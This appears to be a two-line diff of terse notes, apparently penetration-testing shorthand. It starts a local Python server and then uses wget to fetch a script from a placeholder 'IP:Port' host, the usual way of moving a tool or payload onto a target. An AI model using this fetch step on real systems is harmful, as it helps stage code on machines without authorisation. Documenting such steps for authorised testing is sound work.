@@ -1,0 +1,2 @@
+Launch python -m Port
+wget http://IP:Port/FilePath/script 
